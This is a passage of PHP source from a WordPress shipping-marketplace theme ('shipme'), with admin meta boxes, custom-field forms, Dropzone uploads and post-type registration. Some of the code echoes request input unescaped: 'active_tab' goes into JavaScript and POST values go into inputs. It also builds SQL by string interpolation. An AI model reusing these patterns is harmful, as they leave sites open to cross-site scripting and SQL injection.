 		$hwstring = image_hwstring($width, $height);
 		if ( is_array($size) )
 			$size = join('x', $size);
 		$attachment =& get_post($attachment_id);
 		$default_attr = array(
 			'src'	=> $src,
 			'class'	=> "attachment-$size",
 			'alt'	=> trim(strip_tags( get_post_meta($attachment_id, '_wp_attachment_image_alt', true) )), // Use Alt field first
 			'title'	=> trim(strip_tags( $attachment->post_title )),
 		);
 		if ( empty($default_attr['alt']) )
 			$default_attr['alt'] = trim(strip_tags( $attachment->post_excerpt )); // If not, Use the Caption
 		if ( empty($default_attr['alt']) )
 			$default_attr['alt'] = trim(strip_tags( $attachment->post_title )); // Finally, use the title

 		$attr = wp_parse_args($attr, $default_attr);
 		$attr = apply_filters( 'wp_get_attachment_image_attributes', $attr, $attachment );
 		$attr = array_map( 'esc_attr', $attr );
 		$html = rtrim("<img $hwstring");

 		$html = $attr['src'];
 	}

 	return $html;
 }

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/

 function shipme_generate_thumb($img_ID, $width, $height, $cut = true)
 {
 	$xx = shipme_wp_get_attachment_image($img_ID, array($width, $height ));
 	if(empty($xx)) $xx = shipme_wp_get_attachment_image(($img_ID - 1), array($width, $height ));
 	return $xx;
 }

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_post_images($pid, $limit = -1)
 {

 		//---------------------
 		// build the exclude list
 		$exclude = array();

 		$args = array(
 		'order'          => 'ASC',
 		'post_type'      => 'attachment',
 		'post_parent'    => $pid,
 		'meta_key'		 => 'another_reserved1',
 		'meta_value'	 => '1',
 		'numberposts'    => -1,
 		'post_status'    => null,
 		);
 		$attachments = get_posts($args);
 		if ($attachments) {
 			foreach ($attachments as $attachment) {
 			$url = $attachment->ID;
 			array_push($exclude, $attachment->ID);
 		}
 		}

 		//-----------------


 		$arr = array();

 		$args = array(
 		'order'          => 'ASC',
 		'orderby'        => 'post_date',
 		'post_type'      => 'attachment',
 		'post_parent'    => $pid,
 		'exclude'    		=> $exclude,
 		'post_mime_type' => 'image',
 		'numberposts'    => $limit,
 		); $i = 0;

 		$attachments = get_posts($args);
 		if ($attachments) {

 			foreach ($attachments as $attachment) {

 				$url =  ($attachment->ID);
 				array_push($arr, $url);

 		}
 			return $arr;
 		}
 		return false;
 }


 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/

 function shipme_total_live_jobs_of_user($uid)
 {
   return 0;
 }

 add_action( 'admin_enqueue_scripts', 'shipme_admin_style_sheet2' );

 function shipme_admin_style_sheet2()
 {
 wp_enqueue_style( 'wp-color-picker');

 }

 function shipme_admin_style_sheet()
 {

 	wp_enqueue_script("jquery-ui-widget");
 	wp_enqueue_script("jquery-ui-mouse");
 	wp_enqueue_script("jquery-ui-tabs");
 	wp_enqueue_script("jquery-ui-datepicker");

 	wp_enqueue_script( 'wp-color-picker' );
 ?>


     <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/css/tipTip.css" type="text/css" />
     <link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/css/admin.css" type="text/css" />


     <script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/jquery_tip.js"></script>
 	<script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/idtabs.js"></script>
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">

 	<script type="text/javascript">

  var $ = jQuery;


      jQuery(function() {
         //jQuery( document ).tooltip();
     });


 		<?php

 			$tb = "tabs1";
 			if(isset($_GET['active_tab'])) $tb = $_GET['active_tab'];

 		?>

 		jQuery(document).ready(function() {
   			jQuery("#usual2 ul").idTabs("<?php echo $tb; ?>");
 			jQuery(".tltp_cls").tipTip({maxWidth: "330"});
 		});


 		var SITE_URL = '<?php bloginfo('siteurl'); ?>';
 		var SITE_CURRENCY = '<?php echo shipme_currency(); ?>';
 		</script>


     <?php

 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_job_ship_category_fields($catid, $pid = '', $step = '')
 {
 	global $wpdb;
 	$s = "select * from ".$wpdb->prefix."ship_custom_fields where tp!='6' order by ordr asc";
 	$r = $wpdb->get_results($s);

 	$sms = 0;
 	$sms = apply_filters('shipme_get_get_cat_fields_thing', $sms);

 	if($sms == 1)
 	{
 		$s = "select * from ".$wpdb->prefix."ship_custom_fields order by ordr asc";
 		$r = $wpdb->get_results($s);
 	}


 	if(!empty($step))
 	{
 		$s = "select * from ".$wpdb->prefix."ship_custom_fields where step_me='$step' order by ordr asc";
 		$r = $wpdb->get_results($s);
 	}

 	$arr1 = array(); $i = 0;

 	foreach($r as $row)

 	{
 		$ims = $row->id;
 		$name = $row->name;
 		$tp = $row->tp;

 		if($row->cate == 'all')
 		{
 			$arr1[$i]['id'] = $ims;
 			$arr1[$i]['name'] = $name;
 			$arr1[$i]['tp'] = $tp; $i++;

 		}
 		else
 		{
 			$se = "select * from ".$wpdb->prefix."ship_custom_relations where custid='$ims'";
 			$re = $wpdb->get_results($se);

 			if(count($re) > 0)
 			foreach($re as $rowe) // = mysql_fetch_object($re))
 			{
 				if($rowe->catid == $catid)
 				{
 					$arr1[$i]['id'] = $ims;
 					$arr1[$i]['name'] = $name;
 					$arr1[$i]['tp'] = $tp;
 					$i++;
 					break;
 				}
 			}
 		}
 	}

 	$arr = array();
 	$i = 0;

 	for($j=0;$j<count($arr1);$j++)
 	{
 		$ids = $arr1[$j]['id'];
 		$tp = $arr1[$j]['tp'];

 		$arr[$i]['field_name']  = $arr1[$j]['name'];
 		$arr[$i]['value']  = '<input type="hidden" value="'.$ids.'" name="custom_field_id[]" />';
 		$arr[$i]['id']  =  $ids;

 		if($tp == 1)
 		{

 		$teka = !empty($pid) ? get_post_meta($pid, 'custom_field_ID_'.$ids, true) : "" ;

 		$arr[$i]['value']  .= '<input class="full_wdth_me do_input_new" type="text" size="30" name="custom_field_value_'.$ids.'"
 		value="'.(isset($_POST['custom_field_value_'.$ids]) ? $_POST['custom_field_value_'.$ids] : $teka ).'" />';

 		}

 		if($tp == 5)
 		{

 			$teka 	= !empty($pid) ? get_post_meta($pid, 'custom_field_ID_'.$ids, true) : "" ;
 			$value 	= isset($_POST['custom_field_value_'.$ids]) ? $_POST['custom_field_value_'.$ids] : $teka;

 			$arr[$i]['value']  .= '<textarea rows="5" cols="40" name="custom_field_value_'.$ids.'">'.$value.'</textarea>';

 		}

 		if($tp == 3) //radio
 		{


 				$s2 = "select * from ".$wpdb->prefix."shipme_custom_options where custid='$ids' order by ordr ASC ";
 				$r2 = $wpdb->get_results($s2);

 				if(count($r2) > 0)
 				foreach($r2 as $row2) // = mysql_fetch_object($r2))
 				{
 					$teka 	= !empty($pid) ? get_post_meta($pid, 'custom_field_ID_'.$ids, true) : "" ;
 					if(isset($_POST['custom_field_value_'.$ids]))
 					{
 						if($_POST['custom_field_value_'.$ids] == $row2->valval) $value = 'checked="checked"';
 						else $value = '';
 					}
 					elseif(!empty($pid))
 					{
 						$v = get_post_meta($pid, 'custom_field_ID_'.$ids, true);
 						if($v == $row2->valval) $value = 'checked="checked"';
 						else $value = '';

 					}
 					else $value = '';

 					$arr[$i]['value']  .= '<input type="radio" '.$value.' value="'.$row2->valval.'" name="custom_field_value_'.$ids.'"> '.$row2->valval.'<br/>';
 				}
 		}

 		if($tp == 6) //html
 		{
 			$arr[$i]['value']  .= $row->content_box6;

 		}


 		if($tp == 4) //checkbox
 		{


 				$s2 = "select * from ".$wpdb->prefix."shipme_custom_options where custid='$ids' order by ordr ASC ";
 				$r2 = $wpdb->get_results($s2);

 				if(count($r2) > 0)
 				foreach($r2 as $row2) // = mysql_fetch_object($r2))
 				{
 					$teka 	= !empty($pid) ? get_post_meta($pid, 'custom_field_ID_'.$ids) : "" ;
 					$ty = 0;
 					if(!empty($teka))
 					{
 						$ty = 1;
 						foreach($teka as $te)
 						{
 							if($te == $row2->valval) { $ty = 2;  $tekao = "checked='checked'"; break; }
 						}


 					}
 					else $tekao = '';

 					if($ty == 1) $tekao = '';

 					$value 	= isset($_POST['custom_field_value_'.$ids]) ? "checked='checked'" : $tekao;

 					$arr[$i]['value']  .= '<input '.$value.' type="checkbox" value="'.$row2->valval.'" name="custom_field_value_'.$ids.'[]"> '.$row2->valval.'<br/>';
 				}
 		}

 		if($tp == 2) //select
 		{
 			$arr[$i]['value']  .= '<select name="custom_field_value_'.$ids.'" />';

 				$s2 = "select * from ".$wpdb->prefix."shipme_custom_options where custid='$ids' order by ordr ASC ";
 				$r2 = $wpdb->get_results($s2);

 				$teka 	= !empty($pid) ? get_post_meta($pid, 'custom_field_ID_'.$ids, true) : "" ;

 				if(count($r2) > 0)
 				foreach($r2 as $row2) // = mysql_fetch_object($r2))
 				{



 							if($teka == $row2->valval) { $tekak = "selected='selected'";  }
 							else  $tekak = '';



 					$arr[$i]['value']  .= '<option '.$tekak.' value="'.$row2->valval.'">'.$row2->valval.'</option>';

 				}
 			$arr[$i]['value']  .= '</select>';
 		}

 		$i++;
 	}

 	return $arr;
 }


 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_theme_job_dts()
 {
 	global $post;
 	$pid = $post->ID;

 	$paid 					= get_post_meta($pid, "paid", true);
 	$closed 					= get_post_meta($pid, "closed", true);
 	$f 					= get_post_meta($pid, "featured", true);
 	$sealed_bidding 	= get_post_meta($pid, "sealed_bidding", true);


 	?>



     <ul id="post-new4">
     <input name="fromadmin" type="hidden" value="1" />

    <li>
         	<h3><?php _e('Package Pickup','shipme'); ?></h3>
         </li>

         <!-- # JS here -->

          <script src="<?php bloginfo('template_url') ?>/js/picker.js"  ></script>
          <script src="<?php bloginfo('template_url') ?>/js/picker.date.js"  ></script>
          <script src="<?php bloginfo('template_url') ?>/js/legacy.js"  ></script>


         <link rel="stylesheet" type="text/css" href="<?php bloginfo('template_url') ?>/css/datepicker/classic.css">
         <link rel="stylesheet" type="text/css" href="<?php bloginfo('template_url') ?>/css/datepicker/classic.date.css">


         <script>

 		jQuery( document ).ready(function() {
 			jQuery('#pickup_date').pickadate( { min: new Date(),  onSet: function(thingSet) {
     		 jQuery("#pickup_date_hidden").val(thingSet.select/1000 + 12400);

   } });
 			jQuery('#delivery_date').pickadate( { min: new Date() ,  onSet: function(thingSet) {
     		 jQuery("#delivery_date_hidden").val(thingSet.select/1000 + 12400);
   }   });
 		});

 		// This example displays an address form, using the autocomplete feature
 		// of the Google Places API to help users fill in the information.

 		var placeSearch, autocomplete, autocomplete2;


 		function initAutocomplete() {
 		  // Create the autocomplete object, restricting the search to geographical
 		  // location types.
 		  autocomplete = new google.maps.places.Autocomplete(
 			  /** @type {!HTMLInputElement} */(document.getElementById('autocomplete_pickup')),
 			  {types: ['geocode']});

 		  // When the user selects an address from the dropdown, populate the address
 		  // fields in the form.
 		  autocomplete.addListener('place_changed', fillInAddress);


 		  //-------------------------------------------------------------------

 		  autocomplete2 = new google.maps.places.Autocomplete(
 			  /** @type {!HTMLInputElement} */(document.getElementById('autocomplete_delivery')),
 			  {types: ['geocode']});

 		  // When the user selects an address from the dropdown, populate the address
 		  // fields in the form.
 		  autocomplete2.addListener('place_changed', fillInAddress2);


 		}

 		// [START region_fillform]
 		function fillInAddress() {
 		  // Get the place details from the autocomplete object.
 		  var place = autocomplete.getPlace();
 		  var lat = place.geometry.location.lat();
 		  var lng = place.geometry.location.lng();


 			document.getElementById('pickup_lat').value = lat;
 			document.getElementById('pickup_lng').value = lng;

 		}

 		function fillInAddress2() {
 		  // Get the place details from the autocomplete object.
 		  var place = autocomplete2.getPlace();
 		  var lat = place.geometry.location.lat();
 		  var lng = place.geometry.location.lng();


 			document.getElementById('delivery_lat').value = lat;
 			document.getElementById('delivery_lng').value = lng;

 		}
 		// [END region_fillform]

 		// [START region_geolocation]
 		// Bias the autocomplete object to the user's geographical location,
 		// as supplied by the browser's 'navigator.geolocation' object.
 		function geolocate_pickup() {
 		  if (navigator.geolocation) {
 			navigator.geolocation.getCurrentPosition(function(position) {
 			  var geolocation = {
 				lat: position.coords.latitude,
 				lng: position.coords.longitude
 			  };
 			  var circle = new google.maps.Circle({
 				center: geolocation,
 				radius: position.coords.accuracy
 			  });
 			  autocomplete.setBounds(circle.getBounds());
 			});
 		  }
 		}



 		function geolocate_delivery() {
 		  if (navigator.geolocation) {
 			navigator.geolocation.getCurrentPosition(function(position) {
 			  var geolocation = {
 				lat: position.coords.latitude,
 				lng: position.coords.longitude
 			  };
 			  var circle = new google.maps.Circle({
 				center: geolocation,
 				radius: position.coords.accuracy
 			  });
 			  autocomplete.setBounds(circle.getBounds());
 			});
 		  }
 		}

 		// [END region_geolocation]

 			</script>

             <script src="https://maps.googleapis.com/maps/api/js?signed_in=true&libraries=places&callback=initAutocomplete&key=<?php echo get_option('shipme_radius_maps_api_key'); ?>" async defer></script>

         <li class="<?php echo shipme_get_post_new_error_thing('pickup_location') ?>">
         <?php echo shipme_get_post_new_error_thing_display('pickup_location') ?>
         	<h2><?php echo __('Location (address/zip)', 'shipme'); ?></h2>
         	<p><input type="text" size="30" onFocus="geolocate_pickup()" id="autocomplete_pickup" class="do_input form-control" name="pickup_location"
             placeholder="<?php _e('eg: New York, 15th ave','shipme') ?>" value="<?php echo get_post_meta($pid,'pickup_location',true); ?>" /></p>
         </li>

         <input type="hidden" value="<?php echo get_post_meta($pid,'pickup_lat',true) ?>"  name="pickup_lat" id="pickup_lat"  />
         <input type="hidden" value="<?php echo get_post_meta($pid,'pickup_lng',true) ?>"  name="pickup_lng" id="pickup_lng"  />


         <li class="<?php echo shipme_get_post_new_error_thing('pickup_date') ?>">
         <?php echo shipme_get_post_new_error_thing_display('pickup_date') ?>
         	<h2><?php echo __('Pickup Date', 'shipme'); ?></h2>
         	<p><input type="text" size="30" class="do_input form-control" id="pickup_date" placeholder="<?php _e('click here to choose date','shipme') ?>"
             value="<?php $zz = get_post_meta($pid,'pickup_date',true); echo (!empty($zz) ? date("j F, Y", $zz) : '') ; ?>"  /></p>
         </li>

         <input type="hidden" value="<?php echo get_post_meta($pid,'pickup_date',true) ?>"  name="pickup_date" id="pickup_date_hidden"  />



   <li>
         	<h3><?php _e('Package Delivery','shipme'); ?></h3>
         </li>




         <li class="<?php echo shipme_get_post_new_error_thing('delivery_location') ?>">
         <?php echo shipme_get_post_new_error_thing_display('delivery_location') ?>
         	<h2><?php echo __('Location (address/zip)', 'shipme'); ?></h2>
         	<p><input type="text" size="30" class="do_input form-control" onFocus="geolocate_delivery()"  id="autocomplete_delivery" name="delivery_location"
             placeholder="<?php _e('eg: California, San Francisco, Lombard St','shipme') ?>" value="<?php echo get_post_meta($pid,'delivery_location',true); ?>" /></p>
         </li>

         <input type="hidden" value="<?php echo get_post_meta($pid,'delivery_lat',true) ?>"  name="delivery_lat" id="delivery_lat"  />
         <input type="hidden" value="<?php echo get_post_meta($pid,'delivery_lng',true) ?>"  name="delivery_lng" id="delivery_lng"  />


         <li class="<?php echo shipme_get_post_new_error_thing('delivery_date') ?>">
         <?php echo shipme_get_post_new_error_thing_display('delivery_date') ?>
         	<h2><?php echo __('Delivery Date', 'shipme'); ?></h2>
         	<p><input type="text" size="30" class="do_input form-control" id="delivery_date" placeholder="<?php _e('click here to choose date','shipme') ?>"
             value="<?php $zz = get_post_meta($pid,'delivery_date',true); echo !empty($zz) ? date("j F, Y", $zz) : '' ; ?>" /></p>
         </li>


         <input type="hidden" value="<?php echo get_post_meta($pid,'delivery_date',true) ?>"  name="delivery_date" id="delivery_date_hidden"  />


         <?php

 			do_action('shipme_job_dts_form', $pid);

 			$filter_price = true;
 			$filter_price = apply_filters("shipme_filter_price_field_admin", $filter_price);

 			if($filter_price == true):

 		?>
         <li>
         	<h2><?php echo __('Price','shipme'); ?>:</h2>
         <p>

         <input type="text" value="<?php echo get_post_meta($pid,'price',true); ?>" name="price" />

         </p>
         </li>

        <?php endif; ?>


        <li>

        <h2><?php echo __('Packages', 'shipme'); ?></h2>
        <p><input type="text" size="10" class="do_input form-control" name="packages" id="packages" value="<?php echo get_post_meta($pid,'packages',true); ?>" /></p>
        </li>


         <li class="<?php echo shipme_get_post_new_error_thing('length') ?>">
         <?php echo shipme_get_post_new_error_thing_display('length') ?>
         <h2><?php echo __('Length', 'shipme'); ?></h2>
         <p><input type="text" size="10" class="do_input form-control" name="length" id="length" placeholder="<?php echo shipme_get_dimensions_measure() ?>" value="<?php echo get_post_meta($pid,'length',true); ?>" /></p>
         </li>


         <li class="<?php echo shipme_get_post_new_error_thing('width') ?>">
         <?php echo shipme_get_post_new_error_thing_display('width') ?>
         <h2><?php echo __('Width', 'shipme'); ?></h2>
         <p><input type="text" size="10" class="do_input form-control" name="width" id="width" placeholder="<?php echo shipme_get_dimensions_measure() ?>" value="<?php echo get_post_meta($pid,'width',true); ?>" /></p>
         </li>


         <li class="<?php echo shipme_get_post_new_error_thing('height') ?>">
         <?php echo shipme_get_post_new_error_thing_display('height') ?>
         <h2><?php echo __('Height', 'shipme'); ?></h2>
         <p><input type="text" size="10" class="do_input form-control" name="height" id="height" placeholder="<?php echo shipme_get_dimensions_measure() ?>" value="<?php echo get_post_meta($pid,'height',true); ?>" /></p>
         </li>


         <li class="<?php echo shipme_get_post_new_error_thing('weight') ?>">
         <?php echo shipme_get_post_new_error_thing_display('weight') ?>
         <h2><?php echo __('Weight', 'shipme'); ?></h2>
         <p><input type="text" size="10" class="do_input form-control" name="weight" id="weight" placeholder="<?php echo shipme_get_weight_measure() ?>" value="<?php echo get_post_meta($pid,'weight',true); ?>" /></p>
         </li>




      	<li>
         <h2><input type="checkbox" value="1" name="featureds" <?php if($f == '1') echo ' checked="checked" '; ?> /> <?php _e("Feature this job",'shipme');?></h2>

         </li>


         <li>
         <h2><input type="checkbox" value="1" name="sealed_bidding" <?php if($sealed_bidding == '1') echo ' checked="checked" '; ?> /> <?php _e("Sealed Bidding",'shipme');?></h2>

         </li>


         <li>
         <h2><input type="checkbox" value="1" name="closed" <?php if($closed == '1') echo ' checked="checked" '; ?> /> <?php _e("Closed",'shipme');?></h2>

         </li>



         <li>
         <h2><input type="checkbox" value="1" name="paid" <?php if($paid == '1') echo ' checked="checked" '; ?> /> <?php _e("Listing Fee Paid",'shipme');?></h2>

         </li>







         <li>
         <h2>





         <link rel="stylesheet" media="all" type="text/css" href="<?php echo get_bloginfo('template_url'); ?>/css/ui-thing.css" />



        <?php _e("Ad Valid Until:",'shipme'); ?></h2>
         <p><input type="text" name="ending" id="ending" value="<?php

 		$d = get_post_meta($pid,'ending',true);

 		if(!empty($d)) {
 		$r = date_i18n('m/d/Y H:i:s', $d);
 		echo $r;
 		}
 		 ?>" class="do_input"  /></p>
         </li>

  <script>

 jQuery(document).ready(function() {
 	 jQuery('#ending').datepicker({
 	showSecond: true,
 	timeFormat: 'hh:mm:ss'
 });});

  </script>


 	</ul>


 	<?php

 }
 	/*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_set_metaboxes()
 {
   	//add_meta_box( 'ship_custom_fields', 	'job Custom Fields',	'shipme_custom_fields_html', 'job_ship', 'advanced','high' );
 	add_meta_box( 'job_images', 	'Job Images',	'shipme_theme_job_images', 	'job_ship', 'advanced',	'high' );
 	add_meta_box( 'job_files', 		'Job Files',	'shipme_theme_job_files', 	'job_ship', 'advanced',	'high' );
 	//add_meta_box( 'job_bids', 		'job Bids',		'shipme_theme_job_bids', 		'job_ship', 'advanced',	'high' );
 	add_meta_box( 'job_dets', 		'Job Main Details',	'shipme_theme_job_dts', 		'job_ship', 'side',		'high' );

 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_theme_job_files()
 {
 	global $current_user;
 	get_currentuserinfo();
 	$cid = $current_user->ID;

 	global $post;
 	$pid = $post->ID;

 ?>


  <div class="cross_cross">



 	<script type="text/javascript" src="<?php echo get_bloginfo('template_url'); ?>/js/dropzone.js"></script>
 	<link rel="stylesheet" href="<?php echo get_bloginfo('template_url'); ?>/css/dropzone.css" type="text/css" />




     <script>
 Dropzone.autoDiscover = false;

 	jQuery(function() {

 Dropzone.autoDiscover = false;
 var myDropzoneOptions = {
   maxFilesize: 15,
     addRemoveLinks: true,
 	acceptedFiles:'.zip,.pdf,.rar,.doc,.docx,.xls,.xlsx,.ppt,.pptx,.psd,.ai',
     clickable: true,
 	url: "<?php bloginfo('siteurl') ?>/?my_upload_of_jb_files_proj=1",
 };

 var myDropzone = new Dropzone('div#myDropzoneElement', myDropzoneOptions);

 myDropzone.on("sending", function(file, xhr, formData) {
   formData.append("author", "<?php echo $cid; ?>"); // Will send the filesize along with the file as POST data.
   formData.append("ID", "<?php echo $pid; ?>"); // Will send the filesize along with the file as POST data.
 });


     <?php

 		$args = array(
 	'order'          => 'ASC',
 	'orderby'        => 'menu_order',
 	'post_type'      => 'attachment',
 	'meta_key' 		=> 'is_prj_file',
 	'meta_value' 	=> '1',
 	'post_parent'    => $pid,
 	'post_status'    => null,
 	'numberposts'    => -1,
 	);
 	$attachments = get_posts($args);

 	if($pid > 0)
 	if ($attachments) {
 	    foreach ($attachments as $attachment) {
 		$url = $attachment->guid;
 		$imggg = $attachment->post_mime_type;

 		if('image/png' != $imggg && 'image/jpeg' != $imggg)
 		{
 		$url = wp_get_attachment_url($attachment->ID);


 			?>

 					var mockFile = { name: "<?php echo $attachment->post_title ?>", size: <?php echo filesize( get_attached_file( $attachment->ID ) ) ?>, serverId: '<?php echo $attachment->ID ?>' };
 					myDropzone.options.addedfile.call(myDropzone, mockFile);
 					myDropzone.options.thumbnail.call(myDropzone, mockFile, "<?php echo bloginfo('template_url') ?>/images/file_icon.png");


 			<?php


 	}
 	}}


 	?>



 myDropzone.on("success", function(file, response) {
     /* Maybe display some more file information on your page */
 	 file.serverId = response;
 	 file.thumbnail = "<?php echo bloginfo('template_url') ?>/images/file_icon.png";


   });


 myDropzone.on("removedfile", function(file, response) {
     /* Maybe display some more file information on your page */
 	  delete_this2(file.serverId);

   });

 	});

 	</script>

     <script type="text/javascript">

 	function delete_this2(id)
 	{
 		 jQuery.ajax({
 						method: 'get',
 						url : '<?php echo get_bloginfo('siteurl');?>/index.php?_ad_delete_pid='+id,
 						dataType : 'text',
 						success: function (text) {   jQuery('#image_ss'+id).remove();  }
 					 });
 		  //alert("a");

 	}





 	</script>

 	<?php _e('Click the grey area below to add job files. Images are not accepted.','shipme') ?>
     <div class="dropzone dropzone-previews" id="myDropzoneElement" ></div>


 	</div>


 <?php


 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_theme_job_images()
 {
 	global $current_user;
 	get_currentuserinfo();
 	$cid = $current_user->ID;

 	global $post;
 	$pid = $post->ID;


 ?>

      <div class="cross_cross">



 	<script type="text/javascript" src="<?php echo get_bloginfo('template_url'); ?>/js/dropzone.js"></script>
 	<link rel="stylesheet" href="<?php echo get_bloginfo('template_url'); ?>/css/dropzone.css" type="text/css" />




     <script>
 Dropzone.autoDiscover = false;

 	jQuery(function() {

 Dropzone.autoDiscover = false;
 var myDropzoneOptions = {
   maxFilesize: 15,
     addRemoveLinks: true,
 	acceptedFiles:'image/*',
     clickable: true,
 	url: "<?php bloginfo('siteurl') ?>/?my_upload_of_job_files2=1",
 };

 var myDropzone = new Dropzone('div#myDropzoneElement2', myDropzoneOptions);

 myDropzone.on("sending", function(file, xhr, formData) {
   formData.append("author", "<?php echo $cid; ?>"); // Will send the filesize along with the file as POST data.
   formData.append("ID", "<?php echo $pid; ?>"); // Will send the filesize along with the file as POST data.
 });


     <?php

 		$args = array(
 	'order'          => 'ASC',
 	'orderby'        => 'menu_order',
 	'post_type'      => 'attachment',
 	'post_parent'    => $pid,
 	'post_status'    => null,
 	'post_mime_type' => 'image',
 	'numberposts'    => -1,
 	);
 	$attachments = get_posts($args);

 	if($pid > 0)
 	if ($attachments)
 	{
 	    foreach ($attachments as $attachment)
 		{
 			$url = $attachment->guid;
 			$imggg = $attachment->post_mime_type;
 			$url = wp_get_attachment_url($attachment->ID);

 				?>
 						var mockFile = { name: "<?php echo $attachment->post_title ?>", size: <?php echo filesize( get_attached_file( $attachment->ID ) ) ?>, serverId: '<?php echo $attachment->ID ?>' };
 						myDropzone.options.addedfile.call(myDropzone, mockFile);
 						myDropzone.options.thumbnail.call(myDropzone, mockFile, "<?php echo shipme_generate_thumb($attachment->ID, 100, 100) ?>");

 				<?php
 	 	}
 	}

 	?>

 	myDropzone.on("success", function(file, response) {
     /* Maybe display some more file information on your page */
 	 file.serverId = response;
 	 file.thumbnail = "<?php echo bloginfo('template_url') ?>/images/file_icon.png";


   });


 myDropzone.on("removedfile", function(file, response) {
     /* Maybe display some more file information on your page */
 	  delete_this2(file.serverId);

   });

 	});

 	</script>



 	<?php _e('Click the grey area below to add job images. Other files are not accepted. Use the form below.','shipme') ?>
     <div class="dropzone dropzone-previews" id="myDropzoneElement2" ></div>


 	</div>

 <?php

 }

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_option_drop_down($arr, $name)
 {

 	$r = '<select name="'.$name.'">';
 	foreach ($arr as $key => $value)
 	{
 		$r .= '<option value="'.$key.'" '.(get_option($name) == $key ? ' selected="selected" ' : "" ).'>'.$value.'</option>';

 	}
     return $r.'</select>';

 }

 function shipme_job_clear_table($colspan = '')
 	{
 		return '        <tr>
 				 <td colspan="'.$colspan.'">&nbsp;</td>
 			</tr>';
 	}

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 add_filter('post_type_link', 'shipme_post_type_link_filter_function', 1, 3);

 function shipme_create_post_type() {

   global $raga_url_thing;
   $icn = get_template_directory_uri()."/images/ship_icon.png";
   register_post_type( 'job_ship',
     array(
       'labels' => array(
         'name' 			=> __( 'Jobs','shipme' ),
         'singular_name' => __( 'Job','shipme' ),
 		'add_new' 		=> __('Add New Job','shipme'),
 		'new_item' 		=> __('New Job','shipme'),
 		'edit_item'		=> __('Edit Job','shipme'),
 		'add_new_item' 	=> __('Add New Job','shipme'),
 		'search_items' 	=> __('Search Jobs','shipme'),


       ),
       'public' => true,
 	  'menu_position' => 5,
 	  'register_meta_box_cb' => 'shipme_set_metaboxes',
 	  'has_archive' => "jobs-list",
     	'rewrite' => array('slug'=> $raga_url_thing."/%job_ship_cat%",'with_front'=>false),
 		'supports' => array('title','editor','author','thumbnail','excerpt','comments'),
 	  '_builtin' => false,
 	  'menu_icon' => $icn,
 	  'publicly_queryable' => true,
 	  'hierarchical' => false

     )
   );



 	register_taxonomy( 'job_ship_cat', 'job_ship', array( 'hierarchical' => true, 'label' => __('Job Categories','shipme'),
 	'rewrite'                  =>    true
 	 )  );
 	add_post_type_support( 'job_ship', 'author' );
 	 //add_post_type_support( 'auction', 'custom-fields' );
 	register_taxonomy_for_object_type('post_tag', 'job_ship');

 	//flush_rewrite_rules();


 		//-------------------------
 	//user roles


 	add_role('transporter', __('Transporter','shipme'), array(
     'read' => true, // True allows that capability
     'edit_posts' => false,
     'delete_posts' => false));

 	add_role('customer', __('Customer','shipme'), array(
     'read' => true, // True allows that capability
     'edit_posts' => false,
     'delete_posts' => false));

 	$role = get_role( 'transporter' );
   	$role->remove_cap( 'delete_posts' );
 	$role->remove_cap( 'edit_posts' );
 	$role->remove_cap( 'delete_published_posts' );


 	$role = get_role( 'customer' );
   	$role->remove_cap( 'delete_posts' );
 	$role->remove_cap( 'edit_posts' );
 	$role->remove_cap( 'delete_published_posts' );

 }

 function shipme_get_job_primary_cat($pid)
 {
 	$job_terms = wp_get_object_terms($pid, 'job_ship_cat');

 	if(is_array($job_terms))
 	{
 		return 	$job_terms[0]->term_id;
 	}

 	return 0;
 }

 function shipme_get_images_cost_extra($pid)
 {
 	$shipme_charge_fees_for_images 	= get_option('shipme_charge_fees_for_images');
 	$shipme_extra_image_charge		= get_option('shipme_extra_image_charge');

 	//---------------------------

 	$image_fee_paid = get_post_meta($pid, 'image_fee_paid', true);
 	if(empty($image_fee_paid)) { $image_fee_paid = 0; update_post_meta($pid, 'image_fee_paid', 0);  }

 	if($shipme_charge_fees_for_images == "yes")
 	{
 		$shipme_nr_of_free_images = get_option('shipme_nr_of_free_images');
 		if(empty($shipme_nr_of_free_images)) $shipme_nr_of_free_images = 1;

 		$shipme_get_post_nr_of_images = shipme_get_post_nr_of_images($pid);

 		$nr_imgs = $shipme_get_post_nr_of_images - $shipme_nr_of_free_images - $image_fee_paid;
 		if($nr_imgs > 0)
 		{
 			return $nr_imgs*	$shipme_extra_image_charge;
 		}

 	}

 	return 0;

 }
 global $rm32192, $rt32343, $yt234, $idf8323;
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_login_url()
 {
 	return get_bloginfo('siteurl') . "/wp-login.php";
 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_auto_draft($uid)
 {
 	global $wpdb;
 	$querystr = "
 		SELECT distinct wposts.*
 		FROM $wpdb->posts wposts where
 		wposts.post_author = '$uid' AND wposts.post_status = 'auto-draft'
 		AND wposts.post_type = 'job_ship'
 		ORDER BY wposts.ID DESC LIMIT 1 ";

 	$row = $wpdb->get_results($querystr, OBJECT);
 	if(count($row) > 0)
 	{
 		$row = $row[0];
 		return $row->ID;
 	}

 	return shipme_create_auto_draft($uid);
 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_create_auto_draft($uid)
 {
 		$my_post = array();
